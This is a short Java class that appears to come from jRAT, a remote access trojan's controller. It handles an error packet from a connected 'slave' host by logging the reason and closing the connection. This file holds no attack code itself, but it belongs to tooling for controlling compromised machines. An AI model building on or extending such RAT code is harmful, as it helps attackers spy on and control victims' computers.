package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.exceptions.CloseException;


public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		Main.instance.getPanelLog().addEntry("Error", slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
